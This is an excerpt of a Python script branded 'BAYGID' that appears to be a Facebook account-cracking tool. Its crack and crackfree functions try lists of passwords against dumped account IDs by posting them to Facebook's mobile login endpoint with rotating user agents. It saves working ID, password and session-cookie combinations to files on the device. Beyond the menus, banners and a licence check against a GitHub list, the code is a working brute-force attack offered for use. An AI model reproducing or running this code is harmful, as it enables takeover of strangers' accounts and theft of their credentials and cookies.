...
logo =(f"""
\033[31;1m  /$$$$$$$   /$$$$$$  /$$     /$$ /$$$$$$  /$$$$$$ /$$$$$$$ 
\033[30;1m | $$__  $$ /$$__  $$|  $$   /$$//$$__  $$|_  $$_/| $$__  $$
\033[33;1m | $$  \ $$| $$  \ $$ \  $$ /$$/| $$  \__/  | $$  | $$  \ $$
\033[34;1m | $$$$$$$ | $$$$$$$$  \  $$$$/ | $$ /$$$$  | $$  | $$  | $$
\033[35;1m | $$__  $$| $$__  $$   \  $$/  | $$|_  $$  | $$  | $$  | $$
\033[30;1m | $$  \ $$| $$  | $$    | $$   | $$  \ $$  | $$  | $$  | $$
\033[37;1m | $$$$$$$/| $$  | $$    | $$   |  $$$$$$/ /$$$$$$| $$$$$$$/
\033[37;1m |_______/ |__/  |__/    |__/    \______/ |______/|_______/ 


\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m● \x1b[38;5;46mBAYGID
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46mBAYGID
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Baygid11/RAKIB-1/blob/main/APPROVAL.txt').text
    if id in httpCaht:
      print(fuckyoursali)
...
#os.system('espeak -a 300 " Welcome,   to,  BAYGID,  V I P,  Tools"')
def back():
	login()
...
#while attemps < 12345677901:
 #     username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
  ...
  #  if username == 'BAYGID' and password == '63':
...
def menu():
    ...
    print('\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
    BAYGID = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
    if BAYGID in ['111']:
        login()
        dump_massal()
    elif BAYGID in ['1']:
        ...
        #os.system('xdg-open https://github.com/RX-BAYGID')
        os.system("python nono.py")
    elif BAYGID in ['3','03']:
        result()
    elif BAYGID in ['0']:
...
def setting():
    ...
    #os.system("xdg-open https://www.facebook.com/BAYGID.King.Ok.Bro")
    if hc in ['1','01']:
...
def passwrd():
   ...
   # print("\033[1;91m[\033[1;92m√\033[1;91m] \033[41m\x1b[1;97m𝚂𝚃𝙰𝚁𝚃𝙴𝙳 𝚈𝙾𝚄𝚁 𝙲𝙻𝙾𝙽𝙸𝙽𝙶 𝚃𝙸𝙼𝙴\033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
    ...
    os.system("python BAYGID-6-3.py")
    exit()
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[BAYGID-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mBAYGID-CP\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> {idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \033[1;92m{pw}')
                print('\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
                ...
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mBAYGID-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[💙]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                print('\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
           #     os.system('espeak -a 300 " BAYGID,  Ok,  id"')
                open('/sdcard/BAYGID M2-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                break
...
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[BAYGID-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mBAYGID-CP\033[1;91m] {idf} • {pw}')
                print('\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•BAYGID-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                print('\x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
              #  os.system('espeak -a 300 " BAYGID,  Ok,  id"')
                open('/sdcard/BAYGID M3-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                break
